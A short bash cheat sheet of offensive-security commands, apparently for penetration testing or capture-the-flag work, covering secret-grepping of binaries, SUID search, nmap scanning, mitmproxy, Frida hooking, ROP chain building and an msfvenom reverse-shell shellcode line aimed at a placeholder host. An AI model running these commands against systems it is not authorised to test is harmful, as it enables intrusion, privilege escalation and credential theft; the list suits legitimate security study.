#!/bin/bash

# Strings with context
strings -a binary | grep -i "password\|key\|secret"

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Quick port scan
nmap -sV -sC -oA scan target

# Start mitmproxy
mitmproxy -p 8080

# Frida hook example
frida -U -f com.app -l script.js --no-pause

# ROPgadget
ROPgadget --binary ./vuln --ropchain

# Generate shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f python
